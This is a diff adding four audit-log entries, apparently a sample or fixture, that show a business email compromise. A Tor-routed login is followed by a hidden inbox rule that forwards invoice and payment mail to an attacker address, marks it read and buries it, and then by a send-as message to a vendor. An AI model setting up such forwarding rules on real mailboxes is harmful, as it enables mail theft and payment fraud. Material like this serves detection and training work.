@@ -1,0 +1,4 @@
+{"CreationDate":"2026-09-24T10:02:15Z","UserId":"sari.finance@target.com","Operation":"UserLoggedIn","ClientIP":"185.220.101.47 - berlin01.tor-exit.artikel10.org","ResultStatus":"Succeeded"}
+{"CreationDate":"2026-09-24T10:04:33Z","UserId":"sari.finance@target.com","Operation":"New-InboxRule","Parameters":{"Name":".","ForwardTo":"attacker_finance@protonmail.com","SubjectContainsWords":["invoice","payment","transfer","tagihan","remittance"],"MarkAsRead":true,"MoveToFolder":"RSS Subscriptions","StopProcessingRules":true},"ResultStatus":"Succeeded","ClientIP":"185.220.101.47"}
+{"CreationDate":"2026-09-24T10:05:12Z","UserId":"sari.finance@target.com","Operation":"UpdateInboxRule","Parameters":{"Identity":".","Priority":0},"ResultStatus":"Succeeded"}
+{"CreationDate":"2026-09-24T10:15:45Z","UserId":"sari.finance@target.com","Operation":"SendAs","Parameters":{"Recipients":"vendor-finance@targetvendor.com"},"ResultStatus":"Succeeded"}
